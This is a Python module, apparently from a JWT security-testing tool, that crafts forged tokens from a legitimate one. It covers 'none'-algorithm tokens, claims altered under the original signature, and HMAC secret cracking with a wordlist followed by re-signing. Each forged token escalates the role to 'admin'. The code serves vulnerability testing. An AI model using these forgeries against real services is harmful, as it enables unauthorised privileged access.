"""Crafting of attack tokens from a legitimately issued baseline token."""
from __future__ import annotations

import hashlib
import hmac
import json
import time
from typing import Optional

from ..config import AnalysisConfig
from ..parser import b64url_encode, parse_token
from ..rules.weak_key import HMAC_ALGS, crack_hmac, load_wordlist


def _enc(obj: dict) -> str:
    return b64url_encode(json.dumps(obj, separators=(",", ":")).encode())


def escalate(payload: dict) -> dict:
    """Privilege-escalated copy of the claims (what an attacker would want)."""
    forged = dict(payload)
    forged["role"] = "admin"
    return forged


def none_alg_token(baseline: str, alg_value: str = "none") -> str:
    t = parse_token(baseline)
    header = dict(t.header, alg=alg_value)
    return f"{_enc(header)}.{_enc(escalate(t.payload))}."


def tampered_signature_token(baseline: str) -> str:
    """Change the claims but keep the original signature."""
    t = parse_token(baseline)
    return f"{t.header_b64}.{_enc(escalate(t.payload))}.{t.signature_b64}"


def sign_hs(header: dict, payload: dict, secret: str) -> str:
    alg = header.get("alg", "HS256")
    signing_input = f"{_enc(header)}.{_enc(payload)}"
    sig = hmac.new(secret.encode(), signing_input.encode(), HMAC_ALGS[alg]).digest()
    return f"{signing_input}.{b64url_encode(sig)}"


def recover_secret(baseline: str, config: Optional[AnalysisConfig] = None) -> Optional[str]:
    config = config or AnalysisConfig()
    t = parse_token(baseline)
    candidates = list(config.extra_secrets) + list(load_wordlist(str(config.wordlist_path)))
    return crack_hmac(t, candidates)


def weak_key_forgery_token(baseline: str, secret: str) -> Optional[str]:
    t = parse_token(baseline)
    if t.alg not in HMAC_ALGS:
        return None
    now = int(time.time())
    payload = escalate(t.payload)
    payload.update(iat=now, exp=now + 600)
    return sign_hs(t.header, payload, secret)
